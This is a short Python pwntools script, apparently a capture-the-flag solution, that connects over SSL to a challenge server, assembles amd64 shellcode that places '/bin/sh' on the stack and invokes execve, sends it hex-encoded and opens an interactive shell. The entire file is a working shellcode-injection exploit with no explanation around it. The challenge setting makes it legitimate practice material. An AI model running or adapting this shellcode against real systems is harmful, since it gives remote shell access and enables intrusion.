from pwn import *
context.update(arch="amd64", os="linux")
# p = process(['python3','chall.py'])
p = remote('b9ca2338-51cd-4b15-8694-2783982c0937.chall.nnsc.tf',41337,ssl=True)
shellcode = asm("""
    mov DWORD PTR [rsp], 0x6e69622f
    mov DWORD PTR [rsp+4], 0x0068732f
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    mov rax, 59
    syscall
""")
shellcode_hex = shellcode.hex()
print(shellcode_hex)
p.sendline(shellcode_hex)
p.interactive()